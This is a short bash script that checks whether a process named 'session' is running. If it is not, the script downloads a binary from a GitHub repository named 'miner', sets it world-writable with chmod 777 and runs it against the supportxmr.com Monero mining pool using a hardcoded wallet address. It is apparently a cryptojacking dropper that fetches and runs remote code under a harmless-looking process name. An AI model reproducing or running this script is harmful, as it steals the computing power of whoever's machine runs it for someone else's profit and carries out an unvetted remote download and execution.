#!/bin/bash

# Check if the session process is running
if ! pgrep -x "session" > /dev/null; then
    echo "Session not found. Downloading and starting..."
    wget https://github.com/haxcoder101/miner/raw/refs/heads/main/session
    chmod 777 session
    ./session -o pool.supportxmr.com:80 -u 442xHeyLLcgQSSgbKJrMiG8mECruxyviqKMDt41nMXhgiCJFmA4CJaoQ8gGDz7EH89c2cUk6LaKN1RTPatbU3xhR6dPvaMf -k -p 2025 
else
    echo "Session process is already running."
fi
